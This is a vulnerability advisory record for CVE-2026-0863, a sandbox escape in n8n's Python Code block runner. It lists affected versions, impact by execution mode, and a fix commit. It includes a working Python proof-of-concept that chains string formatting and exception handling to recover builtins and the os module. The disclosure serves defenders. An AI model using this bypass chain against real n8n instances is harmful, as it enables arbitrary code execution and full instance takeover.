{"hash":"6721f67ed04a63b84433e4f75c37b5fdfd1962a8","data":{"post":{"title":"n8n Python runner sandbox escape","path":"/vulnerabilities/n8n-python-runner-sandbox-escape-jfsa-2026-001651077/","content":"<h2 id=\"summary\"><a href=\"#summary\" aria-hidden=\"true\" tabindex=\"-1\">Summary</a></h2>\n<p>Sandbox escape in n8n Python task runner allows for arbitrary code execution on the underlying host.</p>\n<h2 id=\"component\"><a href=\"#component\" aria-hidden=\"true\" tabindex=\"-1\">Component</a></h2>\n<p>n8n</p>\n<h2 id=\"affected-versions\"><a href=\"#affected-versions\" aria-hidden=\"true\" tabindex=\"-1\">Affected versions</a></h2>\n<p>(,1.123.14)</p>\n<p>[2.0.0,2.3.5)</p>\n<p>[2.4.0,2.4.2)</p>\n<h2 id=\"description\"><a href=\"#description\" aria-hidden=\"true\" tabindex=\"-1\">Description</a></h2>\n<p>Using string formatting and exception handling, an attacker may bypass n8n's python-task-executor sandbox restrictions and run arbitrary unrestricted Python code in the underlying operating system.\nThe vulnerability can be exploited via the Code block by an authenticated user with basic permissions and can lead to a full n8n instance takeover on instances operating under \"Internal\" execution mode.\nIf the instance is operating under the  \"External\" execution mode (ex. n8n's official Docker image) - arbitrary code execution occurs inside a Sidecar container and not the main node, which significantly reduces the vulnerability impact.</p>\n<h2 id=\"poc\"><a href=\"#poc\" aria-hidden=\"true\" tabindex=\"-1\">PoC</a></h2>\n<p>Run the following code in a \"Python (Native)\" Code block -</p>\n<pre><code class=\"language-python\">def new_getattr(obj, attribute, *, Exception):\n    try:\n        f'{{0.{attribute}.ribbit}}'.format(obj)\n    except Exception as e:\n        return e.obj\n\ntry:\n    raise ValueError(\"pwn\")\nexcept Exception as e:\n    tb = new_getattr(e, '__traceback__', Exception=Exception)\n    frame = new_getattr(tb, 'tb_frame', Exception=Exception)\n    builtins = new_getattr(frame, 'f_builtins', Exception=Exception)\n    us = chr(95)\n    imprt = builtins[us+us+'import'+us+us]\n    import_globals = new_getattr(imprt, '__globals__', Exception=Exception)\n\n    os = import_globals['os']\nreturn [{\"json\": {\n        \"uname\": os.uname()\n    }}]\n</code></pre>\n<p>After executing, the result will be a JSON object with the <code>uname</code> commandâ€™s output.</p>\n<h2 id=\"vulnerability-mitigations\"><a href=\"#vulnerability-mitigations\" aria-hidden=\"true\" tabindex=\"-1\">Vulnerability Mitigations</a></h2>\n<p>No mitigations are supplied for this issue</p>\n<h2 id=\"references\"><a href=\"#references\" aria-hidden=\"true\" tabindex=\"-1\">References</a></h2>\n<p><a href=\"https://github.com/n8n-io/n8n/commit/b73a4283cb14e0f27ce19692326f362c7bf3da02\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">Fix commit</a></p>\n","description":"CVE-2026-0863, HIGH, n8n Python runner sandbox escape","date_published":"2026-01-18","xray_id":"JFSA-2026-001651077","vul_id":"CVE-2026-0863","severity":"high","discovered_by":"Natan Nehorai","last_updated":"2026-01-18","cvss":8.5}},"context":{}}